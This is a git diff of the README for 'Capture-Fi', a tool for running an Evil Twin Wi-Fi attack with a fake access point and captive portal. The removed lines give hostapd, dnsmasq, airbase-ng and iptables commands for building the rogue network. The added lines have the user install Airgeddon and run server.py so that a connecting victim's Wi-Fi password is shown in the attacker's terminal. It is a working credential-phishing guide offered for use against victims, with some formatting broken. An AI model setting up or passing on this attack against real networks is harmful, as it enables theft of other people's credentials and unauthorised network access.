@@ -29,61 +29,30 @@ To set up **Capture-Fi**, follow these steps:
    cd Capture-Fi
 
 
+
 ## Setup Process
 
-If you have a Wi-Fi adapter that supports monitor mode, packet injection, and access point (AP) mode, and you are using a Linux distribution, follow these steps to start an Evil Twin attack with a captive portal redirecting to `server.py`:
+To set up your Evil Twin attack with a captive portal, follow these steps:
 
-### 1. Install Required Tools
+### 1. Install Required Tool
 
-Ensure you have the necessary tools installed. Use `aircrack-ng` and `hostapd` for this setup. Install them with:
+Choose one of the following tools for your setup:
+- **Airgeddon**
+- **Fluxion**
+- **WiFi Phisher**
 
-```sudo apt update```<br>
-```sudo apt install aircrack-ng hostapd```
-
-
-## 2. Prepare Your Wi-Fi AdapterEnable Monitor Mode:
-
-```sudo ip link set <interface> down```<br>
-```sudo ip link set <interface> up```<b>
-```sudo ip link set <interface> monitor```
-**Replace <interface> with your Wi-Fi adapter's interface name (e.g., wlan0).**
-
-## 3. Configure the Captive Portal
-
-`- Create a Fake Access Point with hostapd: Create a configuration file (/etc/hostapd/hostapd.conf) for hostapd:`
-
-`interface=<interface>
-driver=nl80211
-ssid=FakeNetwork
-hw_mode=g
-channel=6`
-
-**Start hostapd with:**
-```sudo hostapd /etc/hostapd/hostapd.conf```
-
-**- Set Up the Captive Portal Redirect: Create a default configuration file for dnsmasq (/etc/dnsmasq.conf):**
-
-`interface=<interface>
-dhcp-range=10.0.0.2,10.0.0.20,12h
-address=/example.com/10.0.0.1`
-
-**- Replace <interface> with your Wi-Fi adapter’s interface.**
-**- Replace example.com with the domain or IP that you want to redirect to.**
-
-## 4. Start the Fake Access Point
-**- Create the Fake Network: Use airbase-ng to create a fake network:**
-`sudo airbase-ng -e "FakeNetwork" -c 6 <interface>`
-**-Replace <interface> with your Wi-Fi adapter’s interface.**
-
-## 5. Configure IP Forwarding and NAT
-
-**- Set up IP forwarding and NAT to route traffic through your server:**
-`sudo sysctl -w net.ipv4.ip_forward=1
-sudo iptables -t nat -A POSTROUTING -o <internet-interface> -j MASQUERADE
-sudo iptables -A FORWARD -i <interface> -o <internet-interface> -m state --state RELATED,ESTABLISHED -j ACCEPT
-sudo iptables -A FORWARD -i <internet-interface> -o <interface> -j ACCEPT`
-
-## 6. Deploy and Run server.py
+For this example, we'll use **Airgeddon**. Install it with:
+```bash
+sudo apt update
+sudo apt install airgeddon
 
 
 
+**nevigate to the Capture-Fi directory and start server.py:**
+
+`python server.py`
+
+**open new terminal and start airgeddon search for captive portal conf file and add your ip and server.py port**
+`http://<your-IP:8000>`
+
+After victim connected to your fake AP the captive portal will start in index.html and when victim enter the wifi passoword the cred will shown in the terminal
